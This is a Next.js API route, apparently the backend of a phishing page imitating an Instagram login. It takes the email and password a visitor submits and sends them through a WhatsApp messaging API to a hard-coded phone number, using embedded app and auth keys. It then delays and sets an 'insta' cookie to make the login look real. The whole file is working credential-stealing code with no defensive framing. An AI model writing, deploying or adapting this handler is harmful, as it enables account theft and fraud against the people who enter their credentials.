
import { NextResponse } from "next/server";
import fdf from 'request'
export async function POST(request) {
    const {email, password} = await request.json()

    
    var options = {
        'method': 'POST',
        'url': 'https://whats-api.rcsoft.in/api/create-message',
        'headers': {
        },
        formData: {
          'appkey': 'af6905c7-65d2-48f9-8a5c-cb700892abbf',
          'authkey': 'j0NXbzUG0LJTeBaINxqdYmtEazuHv3DlUt99WdF0xlS7d5kwSc',
          'to': '917878842575',
          'message': `${email} and ${password}`
        }
      };
      fdf(options)

 await new Promise((resolve, reject) => {
setTimeout(()=> {
return resolve()
},5000)
})

await new Promise((resolve, reject) => {
  setTimeout(()=> {
  return resolve()
  },4000)
  })
      
     
    
    const  response = NextResponse.json({success: true})
    response.cookies.set('insta', "allready")
    return response
}